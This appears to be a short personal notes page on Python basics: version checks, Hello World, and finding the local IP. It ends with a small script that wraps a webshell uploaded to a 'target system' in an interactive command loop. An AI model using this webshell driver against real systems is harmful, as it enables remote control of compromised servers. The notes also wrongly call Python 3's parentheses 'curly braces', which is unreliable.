Python

With python, lots of fun things can be done. such as the default 'Hello, World!' example. However, one should always be aware of the differences between the now deprecated Python version 2 and version 3.

$ python --version Python 2.7.16

the version can simply be identified by using the --version tag on the commandline

$ python3 --version Python 3.7.3

On some newer systems however, the 'python' command is already linked to version 3 by default.

Python HelloWorld

In python 2, printing can be done by simply stating the text between quotes ("")

print "Hello, World!"

And in Python 3, you need to add curly braces.

print("Hello, World!")
Python ifconfig

With python, it is quite simple to obtain the IP address of the local system.

import socket socket.gethostbyname(socket.gethostname())

by using the socket module, all you need is the system's hostname which you can obtain using the same module.

Python Shell

if a webshell has been uploaded to a target system (i.e. a php webshell), the following code can be used to simulate a more-or-less interactive shell.

#!/usr/bin/env python3 import requests import argparse from urllib.parse import quote from cmd import Cmd parser = argparse.ArgumentParser() parser.add_argument("-t","--target", help="provide the exact url location of the webshell i.e. http://<host>/shell.php?cmd=", required=True) cmdargs = parser.parse_args() class Terminal(Cmd): def __init__(self): self.prompt = "shell> " Cmd.__init__(self) def default(self, args): r = requests.post(cmdargs.target + quote(args)) print(r.text) terminal = Terminal() terminal.cmdloop()

Althought some commands will not work, such as 'cd' to change directories, this makes it much easier to use a webshell.
